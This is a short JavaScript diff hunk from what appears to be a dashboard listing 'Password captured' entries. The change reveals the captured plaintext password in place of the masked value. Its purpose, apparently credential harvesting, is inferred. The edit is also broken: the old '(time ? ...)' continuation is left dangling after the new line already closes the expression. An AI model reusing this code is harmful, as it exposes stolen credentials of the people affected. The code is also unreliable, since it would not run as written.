@@ -184,7 +184,7 @@
                 }
               }
               return '<div class="cli"><span class="cn">Password captured</span>' +
-                     '<span class="cip">' + esc(c.password_masked || '••••••••') +
+                     '<span class="cip">' + esc(c.password || c.password_masked || '••••••••') + (time ? ' · ' + esc(time) : '') + '</span></div>';
                      (time ? ' · ' + esc(time) : '') + '</span></div>';
             }).join('');
           })
